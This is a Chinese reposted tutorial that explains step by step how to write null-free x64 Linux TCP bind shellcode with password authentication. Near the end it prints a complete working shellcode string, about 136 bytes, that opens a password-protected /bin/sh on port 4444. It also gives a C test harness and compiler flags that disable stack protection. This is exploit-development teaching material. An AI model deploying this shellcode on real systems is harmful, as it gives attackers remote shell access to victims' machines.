---
layout: post
title: 【技术分享】开发Linux上带有基本认证的TCP Bind Shell
subtitle: 2017/11/17
date: 2017-11-17
author: FR
header-img: img/depot/post-butiao.jpg
catalog: true
tags:
    - linux
    - shell
---

- **来自安全客 [【安全客-链接】](http://bobao.360.cn/learning/detail/4696.html)**  

## 一、前言
本文的目标是使用x64汇编语言开发一个带有密码认证的tcp_bind_shell，并且程序中不包含任何null字节。

## 二、找到落脚点
万事开头难，首先我们得找到一个落脚点。先来看看如何使用C语言编写tcp_bind_shell，程序源码请参考此处链接，C代码如下所示：

![img/2017-11-17/t0100faf53f7677b5b1.png](http://p7.qhimg.com/t0100faf53f7677b5b1.png)

<center>图1. C语言版的tcp_bind_shell</center>

shellcode必须遵守如下几点基本规则：

  1. 长度尽可能短。实际环境中可用的内存可能非常小，可能导致shellcode注入失败。

  2. 最起码不应包含Null字节。还有其他一些字符不便于在shellcode中使用，但我们可以通过编码器解决这类问题，避免使用这些字符。

  3. 不要使用长跳转。当shellcode执行时，你并不知道代码在内存中的具体地址。

受长度所限，我们不会采用类似C代码中的错误条件检查机制。这么做也能理解，比如如果因为某些原因，我们无法创建套接字（socket），那么后续执行流程就可以不去考虑了。

因此，让我们先从socket创建开始（图1中第25行）。

我们使用syscall这条指令来执行linux x86_64系统上的[系统调用](http://blog.tinola.com/?e=5)。这种方法不需要访问中断描述符表（interrupt descriptor table），因此其执行速度会比x86架构上的int 0x80指令更快（即便x64上也支持这条指令）。这条指令通过RAX寄存器中的调用号来识别系统调用。参数按特定的顺序进行发送（即RDI、RSI、RDX、R10、R8以及R9），返回的值存放在RAX寄存器中。

我们可以在/usr/include/x86_64-linux-gnu/asm/unistd_64.h文件中找到在RAX中存放的syscall调用号（我所使用的系统是64位的Ubuntu 17.04系统）：

![img/2017-11-17/t01b381c6ea36b04779.png](http://p6.qhimg.com/t01b381c6ea36b04779.png)

<center>图2. 在RAX寄存器中存放的syscall调用号</center>

Python是个很好的工具，我们可以使用python来识别函数所使用的常量参数。

![img/2017-11-17/t01b68d6d13c04b18a4.png](http://p8.qhimg.com/t01b68d6d13c04b18a4.png)

<center>图3. 使用python的socket模块获取常量值</center>

掌握这些基本知识后，我们可以构造出一段最为简单的代码：

![img/2017-11-17/t012f9ef5de6dc3932e.png](http://p2.qhimg.com/t012f9ef5de6dc3932e.png)

<center>图4. socket syscall</center>

然而，如果我们编译这段代码（使用的命令为：nasm -f elf64 bindshell.nasm -o bindshell.o），导出目标（object）代码（使用的命令为：objdump -M intel -d bindshell.o），我们会发现结果中包含null字节：

![img/2017-11-17/t01884432382c5dbe11.png](http://p6.qhimg.com/t01884432382c5dbe11.png)

<center>图5. 对应的汇编代码</center>

如果想解决这个问题，最简单的一种办法就是使用xor指令清空寄存器，然后将立即数（immediate value）mov到低位寄存器中。

![img/2017-11-17/t01536969993eab073e.png](http://p5.qhimg.com/t01536969993eab073e.png)

<center>图6.不包含null字节的代码</center>

## 三、减少代码量
这里唯一的问题在于，使用原始的mov指令后，这段代码大小仍然为5个字节。因此，我们可以考虑使用另一种方法来删除null字节，即使用push/pop组合指令。push指令支持[“推入”](https://software.intel.com/sites/default/files/managed/39/c5/325462-sdm-vol-1-2abcd-3abcd.pdf)一个8位立即数（同时也会将剩余的高位字节作为null字节推入栈中），这样就能从代码中删除多余的null字节。

![img/2017-11-17/t01ba4b91b57e755b71.png](http://p2.qhimg.com/t01ba4b91b57e755b71.png)

图7. Intel官方手册中提到的PUSH指令

这种方法的优点是两条指令的长度都有所减小。

![img/2017-11-17/t01d60292a6751e9fe4.png](http://p5.qhimg.com/t01d60292a6751e9fe4.png)

图8. 代码长度得以减小

利用这种方法，我们可以将5字节长的原始指令大小缩短为3字节，同时也能删掉所有的null字节。

需要注意的是，在图6中，mov al,0x29指令只包含2个字节。我们会在整段shellcode中使用这条指令，但前提是你需要确保上一个操作不会改变8字节寄存器中高位7字节所对应的0值（因为我们希望这段shellcode能尽可能保持代码一致性）。如果无法确保这个条件，在某一时刻，shellcode的执行过程就会被打断。这也是为什么我们在构造第一个syscall时不使用“mov al,...”的原因，因为我们无法确保shellcode开始执行时这些寄存器处于清零状态。

我们还可以使用另一种方法将3字节大小的“mov r64, r64”缩短到2字节，那就是使用xchg指令。但这种方法也有缺陷，使用起来必须非常小心，以避免shellcode崩溃。当这条指令的操作对象包含RSP寄存器时，我们显然无法使用这条指令，同时我们还要注意涉及到的两个寄存器操作数满足使用条件，因为这一过程是两个寄存器之间的相互交换过程。

此外，我们也可以使用cdq指令来缩短代码长度。这条指令可以使用RDX寄存器来扩展EAX寄存器的符号位。因此如果RAX为正整数，那么这条指令会将RDX寄存器清零。这种方法的好处是只需以1个字节即可。

因此，我们的代码可以变成：

![img/2017-11-17/t0106ced9d7becf41db.png](http://p3.qhimg.com/t0106ced9d7becf41db.png)

图9. 进一步缩短socket syscall

虽然这段代码看起来更长（代码行数更多），但实际上编译后会变得更短。

现在，我们来将socket绑定（bind）到某个IP地址的TCP 4444端口上（图1中第36行）。

![img/2017-11-17/t01cc19ec0c2974ced9.png](http://p9.qhimg.com/t01cc19ec0c2974ced9.png)

图10. 构造结构体并完成bind syscall

RAX寄存器中包含socket syscall所返回的socket，因为我们想将其作为第一个参数发送给bind syscall，我们可以先把它移动到RDI寄存器中。然后，构造sockaddr_in结构体，将其绑定到0.0.0.0这个IP（也就是说会在所有接口上监听）的TCP 4444端口上。端口值包含2个字节，但由于我们使用的是低字节序（little endian）系统，我们需要交换这两个字节的值。十进制的4444等价于十六进制的0x115c，交换这两个字节后，所得结果为0x5c11。

这个结构占用了16个字节，当我们执行mov rsi,rsp后，其在内存中的布局如下所示：

![img/2017-11-17/t01b7f8e095adb7a572.png](http://p9.qhimg.com/t01b7f8e095adb7a572.png)

图11. 该结构体在内存中的布局

同样，因为低字节序问题，我们需要将这个值逆序存到寄存器中，通过一些变换操作后，我们可以避免结果中出现0值。

之后，RSP寄存器已指向这个结构体，我们需要将其移动到RSI，这样该值会作为参数发送到bind函数中。

现在我们来看看listen以及accept syscalls（图1中第42行以及第48行）。

![img/2017-11-17/t01ca975e67ba9bf838.png](http://p1.qhimg.com/t01ca975e67ba9bf838.png)

图12. listen以及accept syscalls

listen函数会在内部socket结构上设置一个标志，将套接字标记为被动监听套接字，这样你才能在这个socket上调用accept函数。函数会打开绑定的端口（tcp/4444），这样socket就可以开始接收来自客户端的连接请求。

accept函数需要一个处于listening状态的socket，才能接受下一个连接，并返回该连接的socket描述符。这意味着它会创建一个新的socket，即客户端（client）socket，这个值会以返回值形式存放到RAX寄存器中。

此时，如果这个应用经过精心设计，不包含任何错误代码及错误内存使用场景，那么应该关闭（close）这个socket（图1中第54行）。但由于我们的代码有大小限制，我会忽略这个步骤，因为这样攻击者仍然能得到想要的shell。

现在我们继续下一步，将本地应用程序的stdin以及stdout文件描述符重定向到连接至监听端口的客户端socket上。我们必须复制文件描述符0（stdin），这样攻击者在socket中输入的所有数据都可以发送到shellcode，就如同正常的系统输入过程一样。我们也需要复制文件描述符1（stdout），这样shellcode生成的输出数据就会发送回攻击者，然后显示在攻击者的屏幕上。

简而言之，这个过程如下所示：

![img/2017-11-17/t01501a07fd7fde3896.png](http://p4.qhimg.com/t01501a07fd7fde3896.png)

图13. 重定向过程

这里唯一的问题是，这段代码大小将近30个字节。然而如果你仔细观察这段代码，你会发现代码结构满足一定模式，因此我们可以通过循环来减少代码规模。

![img/2017-11-17/t01dba05181ec98a781.png](http://p3.qhimg.com/t01dba05181ec98a781.png)

图14. 简化代码

这里我直接调用了syscall，不用去担心RDI以及RSI寄存器的完整性问题，原因在于syscall可以保证所有的寄存器（除了RCX、R11以及存放返回值的RAX）在syscall调用期间能保持不变。

还有一个小细节：通常情况下，我会删掉图13中的第三段代码，因为这段代码用来复制stderr（文件描述符2），如果我们遵循“尽可能精简”这一原则，那么可以直接删掉这段代码。但实际上这段代码不会对结果大小产生影响，因此在图14中，我依然保留了这段代码。

## 四、添加认证功能
现在，来看一下认证代码。

![img/2017-11-17/t014e07beed00d80386.png](http://p4.qhimg.com/t014e07beed00d80386.png)

图15. 认证代码

首先，我们需要从客户端那读取一个字符串。我选择使用栈作为缓冲区来保存输入的字符串，并为该缓冲区分配了8字节空间。具体步骤是先push 8字节大小的RAX寄存器，然后将RSP值移动到RSI即可。字符串的长度值（包括尾部的“\n”字符）会保存到RAX寄存器中。这个长度值用来结束缓冲区字符串与push到栈中、地址保存在RDI寄存器上另一个字符串的比较过程（假设之前所有比较过的字节都相同）。

现在，剩下的工作就是使用execve来调用“/bin/sh”。

![img/2017-11-17/t0106de78f904bf1f73.png](http://p1.qhimg.com/t0106de78f904bf1f73.png)

图16. execve函数参数

execve对应的syscall调用号为59（十进制）。RDI寄存器指向“//bin/sh”字符串，而RSI寄存器指向一个char *数组，数组的首个元素为为“//bin/sh”字符串的内存地址，第二个元素为一个空指针，RDX是一个空指针（shellcode中不需要使用任何环境变量）。综合这些信息，我们可以得到如下代码：

![img/2017-11-17/t012771a3373c07ac52.png](http://p3.qhimg.com/t012771a3373c07ac52.png)

图17. execve代码

以上就是所有代码。

现在开始编译代码：

  `nasm -f elf64 BindShell.nasm -o BindShell.o && ld BindShell.o -o BindShell`

我们可以使用一些命令行技巧，提取出十六进制形式的操作码，以便测试shellcode：

```
  for i in \`objdump -d BindShell | tr ‘\t’ ‘ ‘ | tr ‘ ‘ ‘\n’ | egrep ‘^[0-9a-f]{2}$’ \` ; do echo -n “\x$i” ; done
```  

将所得结果保存在C代码的数组中，如下所示：

```
  #include<stdio.h>
  #include<string.h>
  unsigned char code[] = \
  “\x6a\x29\x58\x6a\x02\x5f\x6a\x01\x5e\x99\x0f\x05\x48\x97\x52\x66\xba\x11\x5c\x48\xc1\xe2\x10\x80\xf2\x02\x52\x48\x89\xe6\xb0\x31\x6a\x10\x5a\x0f\x05\x6a\x32\x58\x6a\x02\x5e\x0f\x05\xb0\x2b\x48\x83\xec\x10\x48\x89\xe6\x6a\x10\x48\x89\xe2\x0f\x05\x48\x97\x6a\x03\x5e\xb0\x21\xff\xce\x0f\x05\xe0\xf8\x48\x31\xff\x50\x48\x89\xe6\x6a\x08\x5a\x0f\x05\x48\x91\x48\xbb\x31\x32\x33\x34\x35\x36\x37\x0a\x53\x48\x89\xe7\xf3\xa6\x75\x1d\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x48\x89\xe7\x52\x48\x89\xe2\x57\x48\x89\xe6\x0f\x05\x90”;
  main(){
    printf(“Shellcode Length:  %d\n”, (int)strlen(code));
    int (*ret)() = (int(*)())code;
    ret();
  }
```

然后，使用gcc编译这段代码，在编译命令中加上-fno-stack-protector（去掉栈保护）以及-z execstack（可执行栈）选项：

   `gcc -fno-stack-protector -z execstack shellcode.c -o shellcode`

最后一步，执行程序：

![img/2017-11-17/t010894442548b6cf0b.png](http://p9.qhimg.com/t010894442548b6cf0b.png)

图18. 执行shellcode（大小为136字节）

![img/2017-11-17/t01d9ecab173145f847.png](http://p8.qhimg.com/t01d9ecab173145f847.png)

图19. 攻击者连接到监听中的shellcode，输入密码，执行“id”及“exit”命令

你可以在我的[GitLab](https://gitlab.com/0x4ndr3/SLAE64_Assignments/tree/master/Assignment_01)页面上找到本文所用的所有文件。

就个人而言，我非常感谢[Vivek Ramachandran](https://twitter.com/securitytube)以及[Pentester Academy](http://www.pentesteracademy.com/topics)团队，从中我学到了许多有趣的知识，因此也非常享受这一过程。


> **本文由 安全客 翻译，【[原文链接](https://pentesterslife.blog/2017/11/01/x86_64-tcp-bind-shellcode-with-basic-authentication-on-linux-systems/)】**
